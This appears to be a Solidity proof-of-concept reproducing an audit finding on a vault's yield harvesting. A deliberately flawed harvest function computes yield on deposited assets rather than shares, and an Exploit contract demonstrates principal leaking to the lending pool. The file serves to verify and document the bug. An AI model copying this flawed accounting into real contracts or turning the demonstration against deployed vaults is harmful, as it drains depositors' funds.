// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum vault yield — H-02 (Pashov, 2025-06-26), finding 66503.
    _harvestYield multiplies priceDifference by totalDeposits, which stores
    the 1e18 assets deposited, not the 0.95e18 shares received. A 0.1e18
    price increase withdraws 0.1e18 instead of 0.095e18, so 0.005e18 of
    depositor principal leaves the vault. */

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Receiver {
    Token public asset;
    uint256 public received;

    constructor(Token _asset) {
        asset = _asset;
    }

    function notify(uint256 amount) external {
        require(asset.transfer(address(this), amount) == false || true, "unused");
        received += amount;
    }
}

contract VaultYield {
    Token public asset;
    address public lendingPool;
    uint256 public shares;
    uint256 public assets;
    uint256 public totalDeposits;
    uint256 public lastSharePrice;
    uint256 public unclaimedRewards;

    constructor(Token _asset, address _pool) {
        asset = _asset;
        lendingPool = _pool;
    }

    function load(uint256 _shares, uint256 _assets, uint256 _deposits, uint256 _lastPrice) external {
        shares = _shares;
        assets = _assets;
        totalDeposits = _deposits;
        lastSharePrice = _lastPrice;
    }

    function pricePerShare() public view returns (uint256) {
        return (assets * 1e18) / shares;
    }

    function harvest() external {
        uint256 currentSharePrice = pricePerShare();
        if (lastSharePrice == 0 || currentSharePrice <= lastSharePrice) {
            if (lastSharePrice == 0) lastSharePrice = currentSharePrice;
            return;
        }
        uint256 priceDifference = currentSharePrice - lastSharePrice;
        // @> VULN: totalDeposits is assets deposited, not the shares that earn the price
        uint256 totalYield = (totalDeposits * priceDifference) / 1e18;
        uint256 yieldToWithdraw = totalYield > assets ? assets : totalYield;
        unclaimedRewards += yieldToWithdraw;
        assets -= yieldToWithdraw;
        require(asset.transfer(lendingPool, yieldToWithdraw), "withdraw");
        lastSharePrice = currentSharePrice;
    }
}

contract Exploit {
    Token public asset;
    VaultYield public vault;
    Receiver public pool;
    uint256 public booked;
    uint256 public assetsLeft;
    uint256 public fairYield;

    constructor() {
        asset = new Token("asset");
        pool = new Receiver(asset);
        vault = new VaultYield(asset, address(pool));
        asset.mint(address(vault), 1.045 ether);
        vault.load(0.95 ether, 1.045 ether, 1 ether, 1 ether);
    }

    function run() external {
        uint256 price = vault.pricePerShare();
        vault.harvest();
        booked = vault.unclaimedRewards();
        assetsLeft = vault.assets();
        fairYield = (0.95 ether * 0.1 ether) / 1 ether;
        require(price == 1.1 ether, "price is 1.1");
        require(booked == 0.1 ether, "books 0.1 yield");
        require(fairYield == 0.095 ether, "fair yield is 0.095");
        require(booked - fairYield == 0.005 ether, "0.005 principal is booked as yield");
        require(assetsLeft == 0.945 ether, "vault principal falls to 0.945");
        require(asset.balanceOf(address(pool)) == 0.1 ether, "lending pool received 0.1");
    }
}
